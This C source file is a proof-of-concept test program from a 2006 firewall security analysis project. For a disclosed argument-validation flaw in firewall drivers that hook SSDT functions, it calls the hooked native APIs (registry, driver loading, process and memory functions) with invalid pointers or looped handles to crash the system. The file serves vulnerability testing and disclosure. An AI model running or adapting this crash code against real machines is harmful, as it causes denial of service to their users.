/*

 Testing program for Multiple insufficient argument validation of hooked SSDT function (BTP00000P004AO)
 

 Usage:
 prog FUNCNAME
   FUNCNAME - name of function to be checked

 Description:
 This program calls given function with parameters that crash the system. This happens because of 
 insufficient validation of function arguments in the driver of the firewall.

 Test:
 Running the testing program with the name of a function from the list of affected functions.

*/

#undef __STRICT_ANSI__
#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <ddk/ntapi.h>
#include <ddk/ntifs.h>

void about(void)
{
  printf("Testing program for Multiple insufficient argument validation of hooked SSDT function (BTP00000P004AO)\n");
  printf("Windows Personal Firewall analysis project\n");
  printf("Copyright 2006 by Matousec - Transparent security\n");
  printf("http://www.matousec.com/""\n\n");
  return;
}

void usage(void)
{
  printf("Usage: test FUNCNAME\n"
         "  FUNCNAME - name of function to be checked\n");
  return;
}

void print_last_error()
{
  LPTSTR buf;
  DWORD code=GetLastError();
  if (FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,NULL,code,0,(LPTSTR)&buf,0,NULL))
  {
    fprintf(stderr,"Error code: %d\n",code);
    fprintf(stderr,"Error message: %s",buf);
    LocalFree(buf);
  } else fprintf(stderr,"Unable to format error message for code %d.\n",code);
  return;
}


int main(int argc,char **argv)
{
  about();

  if (argc!=2)
  {
    usage();
    return 1;
  }

  if (!stricmp(argv[1],"NtAssignProcessToJobObject") || !stricmp(argv[1],"ZwAssignProcessToJobObject"))
  {
    for (int i=1;i;i++)
      ZwAssignProcessToJobObject(NULL,(HANDLE)i);
  } else if (!stricmp(argv[1],"NtCreateKey") || !stricmp(argv[1],"ZwCreateKey"))
  {
    HANDLE handle;
    ULONG disp;
    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa,(PVOID)1,0,NULL,NULL);
    ZwCreateKey(&handle,KEY_ALL_ACCESS,&oa,0,NULL,0,&disp);
  } else if (!stricmp(argv[1],"NtCreateThread") || !stricmp(argv[1],"ZwCreateThread"))
  {
    HANDLE handle;
    OBJECT_ATTRIBUTES oa;
    CLIENT_ID clid;
    for (int i=1;i;i++)
      ZwCreateThread(&handle,THREAD_ALL_ACCESS,&oa,(HANDLE)i,&clid,NULL,NULL,FALSE);
  } else if (!stricmp(argv[1],"NtDeleteFile") || !stricmp(argv[1],"ZwDeleteFile"))
  {
    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa,(PVOID)1,0,NULL,NULL);
    ZwDeleteFile(&oa);
  } else if (!stricmp(argv[1],"NtLoadDriver") || !stricmp(argv[1],"ZwLoadDriver"))
  {
    UNICODE_STRING us={0x1000,0x1000,(PVOID)1};
    ZwLoadDriver(&us);
  } else if (!stricmp(argv[1],"NtOpenProcess") || !stricmp(argv[1],"ZwOpenProcess"))
  {
    HANDLE handle;
    OBJECT_ATTRIBUTES oa;
    CLIENT_ID clid;
    InitializeObjectAttributes(&oa,(PVOID)1,0,NULL,NULL);
    ZwOpenProcess(&handle,0,&oa,&clid);
  } else if (!stricmp(argv[1],"NtProtectVirtualMemory") || !stricmp(argv[1],"ZwProtectVirtualMemory"))
  {
    PVOID base=argv;
    ULONG oldpr;
    ULONG size=0x1000;
    for (int i=1;i;i++)
      ZwProtectVirtualMemory((HANDLE)i,&base,&size,PAGE_EXECUTE_READWRITE,&oldpr);
  } else if (!stricmp(argv[1],"NtReplaceKey") || !stricmp(argv[1],"ZwReplaceKey"))
  {
    OBJECT_ATTRIBUTES oa,oldoa;
    InitializeObjectAttributes(&oa,(PVOID)1,0,NULL,NULL);
    ZwReplaceKey(&oa,NULL,&oldoa);
  } else if (!stricmp(argv[1],"NtTerminateProcess") || !stricmp(argv[1],"ZwTerminateProcess"))
  {
    for (int i=1;i;i++)
      ZwTerminateProcess((HANDLE)i,0);
  } else if (!stricmp(argv[1],"NtTerminateThread") || !stricmp(argv[1],"NtTerminateThread"))
  {
    for (int i=1;i;i++)
      ZwTerminateThread((HANDLE)i,0);
  } else if (!stricmp(argv[1],"NtUnloadDriver") || !stricmp(argv[1],"ZwUnloadDriver"))
  {
    UNICODE_STRING us={0x1000,0x1000,(PVOID)1};
    ZwUnloadDriver(&us);
  } else if (!stricmp(argv[1],"NtWriteVirtualMemory") || !stricmp(argv[1],"ZwWriteVirtualMemory"))
  {
    ULONG retlen;
    for (int i=1;i;i++)
      ZwWriteVirtualMemory((HANDLE)i,argv,argv,0x10,&retlen);
  } else printf("\nI do not know how to exploit the vulnerability using this function.\n");

  printf("\nTEST FAILED!\n");
  return 1;
}
